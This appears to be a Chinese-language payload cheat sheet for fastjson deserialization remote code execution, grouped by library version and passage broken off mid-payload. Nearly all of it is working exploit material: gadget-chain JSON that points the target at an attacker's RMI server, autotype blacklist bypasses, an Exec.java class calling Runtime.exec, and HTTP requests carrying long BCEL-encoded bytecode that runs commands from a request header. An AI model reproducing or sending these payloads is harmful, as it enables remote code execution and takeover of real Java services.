# fastjson <=1.2.24 反序列化代码执行
## JdbcRowSetImpl
```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"rmi://192.168.16.126:1099/whoopsunix",
  "autoCommit":true
}
```

## TemplatesImpl
```json
{
  "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
  "_bytecodes": ["base64 poc"],
  "_name": "Whoopsunix",
  "_tfactory": {},
  "_outputProperties": {},
}
```

Exec.java
```java
public class Exec extends AbstractTranslet {  
    static {  
        try {  
            Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");  
        } catch (Exception e){  
  
        }  
    }  
  
    @Override  
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {  
  
    }  
  
    @Override  
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {  
  
    }  
}
```

## bcel
jdk8u251之后 bcel被移除
### tomcat-dbcp
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>7.0.47</version>  
</dependency>
```

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami


{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$cb$5b$TW$U$ff$5dH27$c3$m$g$40$Z$d1$wX5$a0$q$7d$d8V$81Zi$c4b$F$b4F$a5$f8j$t$c3$85$MLf$e2$cc$E$b1$ef$f7$c3$be$ec$a6$df$d7u$X$ae$ddD$bf$f6$d3$af$eb$$$ba$ea$b6$ab$ae$ba$ea$7fP$7bnf$C$89$d0$afeq$ee$bd$e7$fe$ce$ebw$ce$9d$f0$cb$df$3f$3e$Ap$I$df$aaHbX$c5$IF$a5x$9e$e3$a8$8a$Xp$8ccL$c1$8b$w$U$e4$U$iW1$8e$T$i$_qLp$9c$e4x$99$e3$94$bc$9b$e4$98$e2$98VpZ$o$cep$bc$c2qVE$k$e7Tt$e2$3c$c7$F$b9$cep$bc$ca1$cbqQ$G$bb$c4qY$c1$V$VW$f1$9a$U$af$ab0PP$b1$h$s$c7$9c$5c$85$U$f3$i$L$iE$F$96$82E$86$c4$a8$e5X$c1Q$86$d6$f4$c0$F$86X$ce$9d$T$M$j$93$96$p$a6$x$a5$82$f0$ce$Z$F$9b4$7c$d4$b4$pd$7b$3e0$cc$a5$v$a3$5c$bb$a2j$U$yQ$z$94$ac$C$9b$fc2$a8y$b7$e2$99$e2$84$r$z$3b$f2e$cfr$W$c6$cd$a2$9bY4$96$N$N$H1$a4$a0$a4$c1$81$ab$a1$8ck$M$a3$ae$b7$90$f1k$b8y$cf$u$89$eb$ae$b7$94$b9$$$K$Z$d3u$C$b1$Sd$3cq$ad$o$fc$ms6$5cs$a1z$c2$b5$e7$84$a7$c0$d3$e0$p$60$e8Z$QA$84$Y$L$C$cf$wT$C$e1S$G2l$d66$9c$85l$ce6$7c_C$F$cb$M$9b$d7$d4$a7$L$8b$c2$M$a8$O$N$d7$b1$c2p$ec$ff$e6$93$X$de$b2$bda$d0$b6Z$$$7e$d9u$7c$oA$5d$cb$8ca$a7$M$bc$92$f1C$db5$lup$92$c03$9e$V$I$aa$eb$86$ccto$b3A1$I$ca$99$J$S$cd$d1C$c3$Ja$Q$tM$d5$e5$DY$88$867$f0$s$f5$d9$y$cd1$u$ae$9fq$a80$Foix$h$efhx$X$ef$d1$e5$cc$c9i$N$ef$e3$D$86$96$acI$b0l$c1r$b2$7e$91$8eC$a6$86$P$f1$R$e9$q$z$81$ed0l$a9$85$a8$E$96$9d$cd$9b$86$e3$c8V$7c$ac$e1$T$7c$aa$e13$7c$ae$e0$a6$86$_$f0$a5l$f8W$e4$e1$f2$98$86$af$f1$8d$86$5b2T$7c$de$aeH$c7q$d3ve$d1$9dk$f9$8e$af$98$a2$iX$$$85$e85$ddRv$de$f0$83E$dfu$b2$cb$V$8a$b4$3aM$M$3dk6$9e$98$b7$a9$85$d9$v$R$U$5d$w$b0$f3$d2$e4$a3$E$8c4$91r$ae$e8$RS4$cdf$c5$f3$84$T$d4$cf$5d$e9$81$c9GQd$d9M$d4FSW$9b$a1I7$a4Yo$827$5cI$9b$N$_$a8M6mj$gjmz$7d$9e$eb$3c$8e$84$ad$ad$d7vl$D$9bK$ebl$g$bd4$b3C$ee$S$96$b3$ec$$$R$edG$g$7d$85$cf$a0$c9W$a4$gX$af$a2$feSN$c7$85i$h$9e$98$ab$e7$d6$ee$8b$60$cc4$85$ef$5b$b5$efF$y$7dQ$7eW$g$a7$f1$86$l$88R$f8$40$cexnYx$c1$N$86$7d$ff$c1$c3j$L$db$C$f7$7c$99$8cr$86$9c$9a$e6n$ad$82$b8$7c$a7$86$e5$Q$c1$bd$8d$8esE$c3$cb$cb$d7$e2$98bd$e0$o$Be$5b$c3Nt$ae$ef$e4H$7d$c6k$aa$b3$V$t$b0J$f5$c7$5c$3ft7$99Ej2$8c$89$VA$_$u$9d$de$60$Q$h$z$88$C$c9Vs$a8H$c9$b0$89B$9dt$ca$95$80$y$85A$acm$ab$87$b3$dcl$c3$F$99$f7$a47$bc$90$eck$V_$i$X$b6U$92$df$U$86$fd$ff$ceu$e3c$96E84$ef$e8$c3$B$fa$7d$91$7f$z$60$f2$ebM2C$a7$9d$b42Z$e3$83w$c1$ee$d0$86$nK2QS$s$c0$f1D$j$da$d2O$O$da$Ip$f5$kZ$aahM$c5$aa$88$9f$gL$rZ$efC$a9$82O$k$60$b4KV$a1NE$80$b6$Q$a0$d5$B$83$a9$f6h$3b$7d$e0$60$84$j$8e$N$adn$e3$91$dd$s$b2Ku$84$d0$cd$c3$89H$bbEjS1$d2$ce$b6$a6$3a$f3$f2J$d1$VJ$a2KO$84R$8f$d5$3dq$5d$d1$e3$EM$S$b4$9b$a0$ea$cf$e8$iN$s$ee$93TS$5b$efa$5b$V$3d$v$bd$8a$ed$df$p$a5$ab$S$a3$ab$b1To$fe6$3a$e4qG$ed$b8$93d$5cO$e6u$5e$c5c$a9$5d$8d$91u$k$3a$ff$J$bbg$ef$a1OW$ab$e8$afb$cf$5d$3c$9e$da$5b$c5$be$w$f6$cb$a03$a1e$3a$aaD$e7Qz$91$7e$60$9d$fe6b$a7$eeH$e6$d9$y$bb$8cAj$95$ec$85$83$5e$92IhP$b1$8d$3a$d0G$bb$n$b4$e306$n$87$OLc3f$b1$F$$R$b8I$ffR$dcB$X$beC7$7e$c0VP$a9x$80$k$fc$K$j$bfa$3b$7e$c7$O$fcAM$ff$T$bb$f0$Xv$b3$B$f4$b11$f4$b3Y$ec$a5$88$7b$d8$V$ec$c7$93$U$edY$c4$k$S$b8M$c1S$K$9eVp$a8$$$c3M$b8$7fF$n$i$da$k$c2$93s$a3$e099$3d$87k$pv$e4$l$3eQL$40E$J$A$A"
        }
    }: "x"
}
```

```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>8.5.42</version>  
</dependency>
```

```json
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami

{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$"
        }
    }: "x"
}
```

## spring
### PropertyPathFactoryBean
```xml
<dependency>  
    <groupId>org.springframework.boot</groupId>  
    <artifactId>spring-boot-starter</artifactId>  
</dependency>
```

```json
{
    "@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean",
    "targetBeanName": "rmi://192.168.1.2:1099/whoopsunix",
    "propertyPath": "whoopsunix",
    "beanFactory": {
      "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
      "shareableResources": [
        "rmi://192.168.1.2:1099/whoopsunix"
      ]
    }
}
```


### DefaultBeanFactoryPointcutAdvisor
```xml
<dependency>  
    <groupId>org.springframework.boot</groupId>  
    <artifactId>spring-boot-starter</artifactId>  
</dependency>
```

```json
{
  "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
   "beanFactory": {
     "@type": "org.springframework.jndi.support.SimpleJndiBeanFactory",
     "shareableResources": [
       "rmi://192.168.1.2:1099/whoopsunix"
     ]
   },
   "adviceBeanName": "rmi://192.168.1.2:1099/whoopsunix"
}
```

# fastjson 1.2.25-1.2.32 反序列化
来自雨了个雨师傅的研究，进行一下整合
## bcel
### ibatis
```xml
<dependency>  
    <groupId>org.mybatis</groupId>  
    <artifactId>mybatis</artifactId>  
    <version>3.5.0</version>  
</dependency>
```

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
X-Token: whoami


{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "b":{
        "@type":"java.lang.Class",
        "val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
    },
	"c":{
		"@type": "com.alibaba.fastjson.JSONObject",
		"name": {
			"@type": "java.lang.Class",
			"val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
		}
	},
	"d":{
		"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader",
		"e": {
			"f":{{
			"@type": "com.alibaba.fastjson.JSONObject",
		"g": {
			"@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
			"driverClassLoader": {
				"$ref": ".."
				},
			"driver":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dW$eb$7b$UW$Z$ff$9d$ddMf2$99$ddM6$q0$b4H$80$sM$C$d9$zB$v$yX$J$J5$98$h$b2$R$K$a9$c5$c9$e4$q$3b$b0$3b$b3$9d$9dM$C$5eZ$ad$da$aaX$b5$o$b6$dem$ad$94$96$aaxY$90$da$8aZ$5b$z$w$5e$3e$f8$cd$3f$c0$8f$3e$7e$f1y$7c$ac$ef$99$99Mv$93$U$c9$93$9c$cb$fb$be$bfs$de$fb$99$bc$f9$df$ab$af$C$d8$8e$h$K$g$60$u$98$C$X$c3$b4$8c$Z$FY$982NH8$a9$40BNB$5e$81$F$5bFA$c6C2$i$ZE$Z$ae$84$92$60$cf$ca$98$931$_$qN$c98$z$e3C$K$3e$8c$8f$c8$f8$a8$82$s$3c$y$86Gd$7cL$cc$l$97$f1$a8$98$3f$n$e3$932$3e$r$e31$Z$8fK$f8$b4$82MB$85M$f8$8c$Y$3e$x$e3$8c8$f8sbxB$c1$e7qJ$M_$90$f0E$ZOJ$f8$92$82$z8$ab$e0$cb8$t$e1$x2$9eR$b0$VO$8b$e1$ab$c2$96$af$c9$f8$ba$8co$c8$f8$a6$84oI$f86C$fd$k$d32$dd$7b$Z$c2$5d$dd$87$Z$o$fd$f6$Ug$88$P$9b$W$l$z$e5$t$b93$aeO$e6$88$92$Y$b6$N$3dwXwL$b1$P$88$R7k$W$Z$d6$M$hv$3e$e5$Y$9c$hY$3b$95$v8$a65$b3$9f$96$bb$Z$e4$3dF$$$b8$mb$d8$W$J$af$l$3e$a1$cf$ea$a9$9cn$cd$a4$i$3e$9d$e3$86$9b$ea$t$8e$eb$94$M$d7v$I$p9$r$cb5$f3t$7eK$95$ec$n$9f$u$f8EC$b7$y$ee$y$f0K$ae$99Ke$7c$o$f1$eb$j$5e$y$e5$5c$a1$f3$o$3c$e3$K$ad$88$5bg$e4$f4$d3$a7$Z$9a$ab$98$fd9$bdX$U$c8$3cw$b3$f6$U$c3$da$V$94$i$f1xB$ca$9e$3cA$84$da$f3$c7$3c$gq$h$i$feP$89$X$dd$R$3aF$nM$Kd$h$X$h$v$60$90S$wdZf$b9$3e$c5$j$c1$97$e7$i$d3$f5$97$R$p$3fu$9c$$$f2$v$M$n$9b$i$X$s$oC4$e3$ea$c6$c9$R$bd$e0$85$80$b2P$c2w$u$H$v$df$u$a2tc$c6$$Q$m$ee3Ex$e2$8b$a1H$KMU$ec$c6$k$J$cf$a8x$W$dfU$f1$i$be$c7$b0$c7vf$92EOn$da$d1$f3$7c$cevN$s$e7$f8d$92$a2$e5$f2y7$Zh$9d$3c$e4$cf$fd$3ey$d0$ce$91$da$S$ce$abx$k$X$YV$cdp7$90$e8s$c9$d5$93$r$97$93$ce$f1$r$3eV$f1$C$5edhZ$ea72B$c5E$bc$c4$b0$f7V$f5$c9pg6$b7$e2$a5$ca$a2$$$M$8d$de$a6$e2$ee$Oq$f1$7c$b2$e8c$93Y$d7$z$q$Hi$a8$3d$8c$82H$a8A$_25$ca$faI$a4$e2$fb$c2$88u$b5g$z$iQ$b9K$9cq$c4$L$a0$8a$l$e0$87$94$A$f7$f7$8e$db$t$b9E$x$bb$98$b4$c88$J$97T$fc$I$3ff$60$ed$w$7e$82$9f$aa$u$e32$DT$5c$c1$cf$u$e4y$ddPq$V$_S$daR$Z$95$e6$J$3agZS$f6$i$99$ZMM$9aVjR$_f$db$7b$8dv$b2$94$f2$p$c9$e7y$7bJ$ecV$_$d5z_$c9$U$nS$f1s$bc$a2$e2UqM$b3$90I$K$99dP$5d$w$7e$81$L$w$ae$e1$97$S$7e$a5$e2$d7x$z$90$aa$a9$c1$KR$d4$5d2$b3P$8c$9e$9ci$a7$OX$85$92K$97r$3d$af$e27x$5d$c2$h$w$7e$8b$dfU$8e$aa$$W$ca$ed$H$faT$bc$89$eb$w$7e$8f$cb$w$fe$80$3f$92$91$o$fen$8e$3cU7$9d$x$V$b3$5e$d5$da$c2$a9$z$8b$ca$ec$9f7x$c15m$92j$5b$b9$ffPgz$bb2$ae$J$ebx$96t$V$b5e$94$i$87$5bne$bf$aa$ab$7bx$a9$UUx$x$F6$u$D$_$a9$87m$3fQ$b4$g$f1$w$96$c0$ac$c8$a0$q$c9$d1$c2$a3Prv$z$efW$cbN$dc$ed$tV$c5$8a$bd$x$60$s$96a$bao$da$ceLk$96$d2$92aW$d7$f2$7e6$b1$9c$d4$bdR$d7k$s$9d$G8$b5V$87OUt$8b$W$b9$dbg$Y$bcX4$fd$d7$a2$eb$98xb$aa$eb$e9T$d1$e5y$bfH$P$3av$81$3b$ee$v$86$ce$ff$e3$87$c5V$5e$y$e4L$aa$d6$3bW$CL$ac$84ht$eda$7b$8e$3b$fd$baH$a6$da$f8$$$I$c9Y$aa$v$ff$j$a4G$f1$Ay$88$da$82$9e$a3$I$b5$ae$e0$a1$eec$q$a0$X$K$dc$o$93$7boI$f5$a0$U$c5U$ae$ed$93$u$e7$a7mgT$X$c5$d5V$e5$cb$aa$97$91a$5b$d7$ad$85$b6$f69$5dwS$B$f2$89$c5$e7$O$d0$5e$b7$M$$$7cy$ab$n$8fP$af1$de$c6$f9U$q$8a$abH$81$dd5$8d$q$m2$c4$c8$d6$aa$7eA$7d$ab$S$93$daFBp$b5T$e4$D$3cg$e6$fd7$f1$s$f7$$$f9$k$88XT$a9$e4kQ$b6$7e$a5$b5$y$af$d4$dd$d8$804$7d$n$89$9f$Q$98x$vi$7c$X$edR4SKF$5d$cfe$b0K$k$fb$5e$g$eb$3d$a2$8cwC$b4kO$A$7b$d1$e7$d1$f6U$c0$e1$bf$91$5c3A$ee$bc$82P$Z$e1D$a4$8c$ba$a1$9eD$7d$f8$VHe$c8$c3$9b$Z$ad$g$caPF$C$81F_$40$N$EF$7b$S$d1$60$99$8e$f4n$J$84$d3uZda$5d$l$mc$84L$c4$p$q$7c4$9ch$ca$94$d1$9c$96$CVB$b0Z$fcs$9a$d3$b2$s$91$g$ab4$d9$h$r$ad$8e0$N$84i$r$8cr$NM$e9$GM$d6$ea$x$c7$x$89$b6$xX$9dXS$86$W$7eg$Zk$d3$8d$89$db$d2$aa$d6$98$8e$86v$c4$b4h$Z$b7$bfH6$8f$d2_$Y$ec$b91$9a7$d4o$3a$f8$_$9a$b7$k$b4$9fy$94$e6$3e$z$9aXW$c6$3b$9eFgxG$ec$3c$dai$bf$de$db$b7E$c4$be$89$f6$ed$de$be$benG$ac5$f6$Ca$ee$A$82P$AZ$f0$d7$9e$d8$90V$cfCJl$a4$fb$h$5e$c7$9f_$c6$a6$a3$97q$87$a6$96$d1$a1$91$b2$jet$a6$d5$E$f9$bak$a8$c7$b7$b6$3b$j$d5$a2dg$8f$W$f5$N$da$7c$N$5b$d2$b1D$af$t$T8$x$99$a9$R$f4$dd$a1$c5$c4$b9$a92$ee$cax$a8$ad$e9$b8$WO$90$H$b6$95$b1$3d$dd$a4$ve$dc$9d$d8Q$ednM$J$90b$a7$i$f1$r$ee$J$bc$ae$v$81C$D$fa$cee$f4$f3$88$M$5d$S$89$U$da$Y$ea$c0$$r$a7H$b3s$e8$a0$b1$91RL$c5jD$vKc$e8E$i$3b$e9_$85$BJ$ad1$q0$81$W$ccb$V$ce$a0$VO$a2$NO$91$e4KXC$l$Okq$j$b7$e1$Gng$DX$cf$G$d1$ce$86$b0$91$8d$a1$83$8d$a3$93$9d$40$X$x$a0$9b$9dF$P$7b$E$9b$d9$T$e8eg$91d$cf$o$c5$$$e0$$$f6$g$b6$b2$3fa$h$fb$t$b6$87$U$dc$j$da$88$5d$a4$d9$3d$a1N$aa$U$91$f6$X$d1L$d8$e7$d1O$9aD$J$7d$W$fbq$lb$84$7b$Q$ef$c1$m$e2$84$3e$84$Dx$_$e9$aa$86$da0$84aB$ad$O5b$84$S$86aC$88$91$fe$H$v$c8$3b$d9$3f$f0$3e$a2$851$c0$feN$98QD0$c6$fe$8a$Mq$eb0$c1$de$c08$ad$ea1$cb$$$e2$fd$c4$95p$86$9d$c3aZ$c9$f4$d1X$c2$R$ba$a3$BWY$W$f7$93$9c$82$eb$ec$I$8e$S$ad$R7X$G$c7h$a5$92$97$40$3a$vo$e1$3f$88Kx$40$c2$H$q$3c$e8$8d$feba$7d$dc$5b$l$f7$7f$v$k$f1$b8$ba$b6$fe$df$I$bf$85$bf$88$94$dc$t$e1$83$m$edu$_$3d$t$ff$H$88$8eZ$e2$z$O$A$A"
			}
		}:"x"}}
	}
}
```

### tomcat-dbcp
同样 7 和 8+ payload不一样
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>8.5.42</version>  
</dependency>
```

```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
X-Token: whoami

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.org.apache.bcel.internal.util.ClassLoader"
    },
    "b":{
        "@type":"java.lang.Class",
        "val":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
"c":{
 "@type": "com.alibaba.fastjson.JSONObject",
"name": {
"@type": "java.lang.Class",
"val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
}
},
"d":{
"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader",
"e": {"f":{{
"@type": "com.alibaba.fastjson.JSONObject",
"g": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {
"$ref": ".." },"driverClassName":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dW$eb$7b$UW$Z$ff$9d$ddMf2$99$ddM6$q0$b4H$80$sM$C$d9$zB$v$yX$J$J5$98$h$b2$R$K$a9$c5$c9$e4$q$3b$b0$3b$b3$9d$9dM$C$5eZ$ad$da$aaX$b5$o$b6$dem$ad$94$96$aaxY$90$da$8aZ$5b$z$w$5e$3e$f8$cd$3f$c0$8f$3e$7e$f1y$7c$ac$ef$99$99Mv$93$U$c9$93$9c$cb$fb$be$bfs$de$fb$99$bc$f9$df$ab$af$C$d8$8e$h$K$g$60$u$98$C$X$c3$b4$8c$Z$FY$982NH8$a9$40BNB$5e$81$F$5bFA$c6C2$i$ZE$Z$ae$84$92$60$cf$ca$98$931$_$qN$c98$z$e3C$K$3e$8c$8f$c8$f8$a8$82$s$3c$y$86Gd$7cL$cc$l$97$f1$a8$98$3f$n$e3$932$3e$r$e31$Z$8fK$f8$b4$82MB$85M$f8$8c$Y$3e$x$e3$8c8$f8sbxB$c1$e7qJ$M_$90$f0E$ZOJ$f8$92$82$z8$ab$e0$cb8$t$e1$x2$9eR$b0$VO$8b$e1$ab$c2$96$af$c9$f8$ba$8co$c8$f8$a6$84oI$f86C$fd$k$d32$dd$7b$Z$c2$5d$dd$87$Z$o$fd$f6$Ug$88$P$9b$W$l$z$e5$t$b93$aeO$e6$88$92$Y$b6$N$3dwXwL$b1$P$88$R7k$W$Z$d6$M$hv$3e$e5$Y$9c$hY$3b$95$v8$a65$b3$9f$96$bb$Z$e4$3dF$$$b8$mb$d8$W$J$af$l$3e$a1$cf$ea$a9$9cn$cd$a4$i$3e$9d$e3$86$9b$ea$t$8e$eb$94$M$d7v$I$p9$r$cb5$f3t$7eK$95$ec$n$9f$u$f8EC$b7$y$ee$y$f0K$ae$99Ke$7c$o$f1$eb$j$5e$y$e5$5c$a1$f3$o$3c$e3$K$ad$88$5bg$e4$f4$d3$a7$Z$9a$ab$98$fd9$bdX$U$c8$3cw$b3$f6$U$c3$da$V$94$i$f1xB$ca$9e$3cA$84$da$f3$c7$3c$gq$h$i$feP$89$X$dd$R$3aF$nM$Kd$h$X$h$v$60$90S$wdZf$b9$3e$c5$j$c1$97$e7$i$d3$f5$97$R$p$3fu$9c$$$f2$v$M$n$9b$i$X$s$oC4$e3$ea$c6$c9$R$bd$e0$85$80$b2P$c2w$u$H$v$df$u$a2tc$c6$$Q$m$ee3Ex$e2$8b$a1H$KMU$ec$c6$k$J$cf$a8x$W$dfU$f1$i$be$c7$b0$c7vf$92EOn$da$d1$f3$7c$cevN$s$e7$f8d$92$a2$e5$f2y7$Zh$9d$3c$e4$cf$fd$3ey$d0$ce$91$da$S$ce$abx$k$X$YV$cdp7$90$e8s$c9$d5$93$r$97$93$ce$f1$r$3eV$f1$C$5edhZ$ea72B$c5E$bc$c4$b0$f7V$f5$c9pg6$b7$e2$a5$ca$a2$$$M$8d$de$a6$e2$ee$Oq$f1$7c$b2$e8c$93Y$d7$z$q$Hi$a8$3d$8c$82H$a8A$_25$ca$faI$a4$e2$fb$c2$88u$b5g$z$iQ$b9K$9cq$c4$L$a0$8a$l$e0$87$94$A$f7$f7$8e$db$t$b9E$x$bb$98$b4$c88$J$97T$fc$I$3ff$60$ed$w$7e$82$9f$aa$u$e32$DT$5c$c1$cf$u$e4y$ddPq$V$_S$daR$Z$95$e6$J$3agZS$f6$i$99$ZMM$9aVjR$_f$db$7b$8dv$b2$94$f2$p$c9$e7y$7bJ$ecV$_$d5z_$c9$U$nS$f1s$bc$a2$e2UqM$b3$90I$K$99dP$5d$w$7e$81$L$w$ae$e1$97$S$7e$a5$e2$d7x$z$90$aa$a9$c1$KR$d4$5d2$b3P$8c$9e$9ci$a7$OX$85$92K$97r$3d$af$e27x$5d$c2$h$w$7e$8b$dfU$8e$aa$$W$ca$ed$H$faT$bc$89$eb$w$7e$8f$cb$w$fe$80$3f$92$91$o$fen$8e$3cU7$9d$x$V$b3$5e$d5$da$c2$a9$z$8b$ca$ec$9f7x$c15m$92j$5b$b9$ffPgz$bb2$ae$J$ebx$96t$V$b5e$94$i$87$5bne$bf$aa$ab$7bx$a9$UUx$x$F6$u$D$_$a9$87m$3fQ$b4$g$f1$w$96$c0$ac$c8$a0$q$c9$d1$c2$a3Prv$z$efW$cbN$dc$ed$tV$c5$8a$bd$x$60$s$96a$bao$da$ceLk$96$d2$92aW$d7$f2$7e6$b1$9c$d4$bdR$d7k$s$9d$G8$b5V$87OUt$8b$W$b9$dbg$Y$bcX4$fd$d7$a2$eb$98xb$aa$eb$e9T$d1$e5y$bfH$P$3av$81$3b$ee$v$86$ce$ff$e3$87$c5V$5e$y$e4L$aa$d6$3bW$CL$ac$84ht$eda$7b$8e$3b$fd$baH$a6$da$f8$$$I$c9Y$aa$v$ff$j$a4G$f1$Ay$88$da$82$9e$a3$I$b5$ae$e0$a1$eec$q$a0$X$K$dc$o$93$7boI$f5$a0$U$c5U$ae$ed$93$u$e7$a7mgT$X$c5$d5V$e5$cb$aa$97$91a$5b$d7$ad$85$b6$f69$5dwS$B$f2$89$c5$e7$O$d0$5e$b7$M$$$7cy$ab$n$8fP$af1$de$c6$f9U$q$8a$abH$81$dd5$8d$q$m2$c4$c8$d6$aa$7eA$7d$ab$S$93$daFBp$b5T$e4$D$3cg$e6$fd7$f1$s$f7$$$f9$k$88XT$a9$e4kQ$b6$7e$a5$b5$y$af$d4$dd$d8$804$7d$n$89$9f$Q$98x$vi$7c$X$edR4SKF$5d$cfe$b0K$k$fb$5e$g$eb$3d$a2$8cwC$b4kO$A$7b$d1$e7$d1$f6U$c0$e1$bf$91$5c3A$ee$bc$82P$Z$e1D$a4$8c$ba$a1$9eD$7d$f8$VHe$c8$c3$9b$Z$ad$g$caPF$C$81F_$40$N$EF$7b$S$d1$60$99$8e$f4n$J$84$d3uZda$5d$l$mc$84L$c4$p$q$7c4$9ch$ca$94$d1$9c$96$CVB$b0Z$fcs$9a$d3$b2$s$91$g$ab4$d9$h$r$ad$8e0$N$84i$r$8cr$NM$e9$GM$d6$ea$x$c7$x$89$b6$xX$9dXS$86$W$7eg$Zk$d3$8d$89$db$d2$aa$d6$98$8e$86v$c4$b4h$Z$b7$bfH6$8f$d2_$Y$ec$b91$9a7$d4o$3a$f8$_$9a$b7$k$b4$9fy$94$e6$3e$z$9aXW$c6$3b$9eFgxG$ec$3c$dai$bf$de$db$b7E$c4$be$89$f6$ed$de$be$benG$ac5$f6$Ca$ee$A$82P$AZ$f0$d7$9e$d8$90V$cfCJl$a4$fb$h$5e$c7$9f_$c6$a6$a3$97q$87$a6$96$d1$a1$91$b2$jet$a6$d5$E$f9$bak$a8$c7$b7$b6$3b$j$d5$a2dg$8f$W$f5$N$da$7c$N$5b$d2$b1D$af$t$T8$x$99$a9$R$f4$dd$a1$c5$c4$b9$a92$ee$cax$a8$ad$e9$b8$WO$90$H$b6$95$b1$3d$dd$a4$ve$dc$9d$d8Q$ednM$J$90b$a7$i$f1$r$ee$J$bc$ae$v$81C$D$fa$cee$f4$f3$88$M$5d$S$89$U$da$Y$ea$c0$$r$a7H$b3s$e8$a0$b1$91RL$c5jD$vKc$e8E$i$3b$e9_$85$BJ$ad1$q0$81$W$ccb$V$ce$a0$VO$a2$NO$91$e4KXC$l$Okq$j$b7$e1$Gng$DX$cf$G$d1$ce$86$b0$91$8d$a1$83$8d$a3$93$9d$40$X$x$a0$9b$9dF$P$7b$E$9b$d9$T$e8eg$91d$cf$o$c5$$$e0$$$f6$g$b6$b2$3fa$h$fb$t$b6$87$U$dc$j$da$88$5d$a4$d9$3d$a1N$aa$U$91$f6$X$d1L$d8$e7$d1O$9aD$J$7d$W$fbq$lb$84$7b$Q$ef$c1$m$e2$84$3e$84$Dx$_$e9$aa$86$da0$84aB$ad$O5b$84$S$86aC$88$91$fe$H$v$c8$3b$d9$3f$f0$3e$a2$851$c0$feN$98QD0$c6$fe$8a$Mq$eb0$c1$de$c08$ad$ea1$cb$$$e2$fd$c4$95p$86$9d$c3aZ$c9$f4$d1X$c2$R$ba$a3$BWY$W$f7$93$9c$82$eb$ec$I$8e$S$ad$R7X$G$c7h$a5$92$97$40$3a$vo$e1$3f$88Kx$40$c2$H$q$3c$e8$8d$feba$7d$dc$5b$l$f7$7f$v$k$f1$b8$ba$b6$fe$df$I$bf$85$bf$88$94$dc$t$e1$83$m$edu$_$3d$t$ff$H$88$8eZ$e2$z$O$A$A"}}:"x"}}
}
}

```


# fastjson 1.2.25-1.2.45 黑名单
这些黑名单都需要手动开启autotype
`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`

## 1.2.41 加L
```json
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```
## 1.2.42 双写L
```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

## 1.2.43 加`[{`
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"rmi://192.168.16.126:1099/whoopsunix", "autoCommit":true}
```

## 1.2.45 利用三方组件
### mybatis
mybatis：3.x.x<3.5.0
```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://192.168.16.126:1099/whoopsunix"}}
```

# fastjson <=1.2.47 反序列化代码执行
## 缓存通杀
对于1.2.25-1.2.32：需关闭AutoTypeSupport

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.16.126:1099/whoopsunix",
        "autoCommit":true
    }
}
```

## bcel

### tomcat-dbcp
同样 7 和 8+ payload不一样
```xml
<dependency>  
    <groupId>org.apache.tomcat</groupId>  
    <artifactId>tomcat-dbcp</artifactId>  
    <version>8.5.42</version>  
</dependency>
```

沿用前面BCEL
```http
POST /test HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: application/json
cmd: whoami

{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
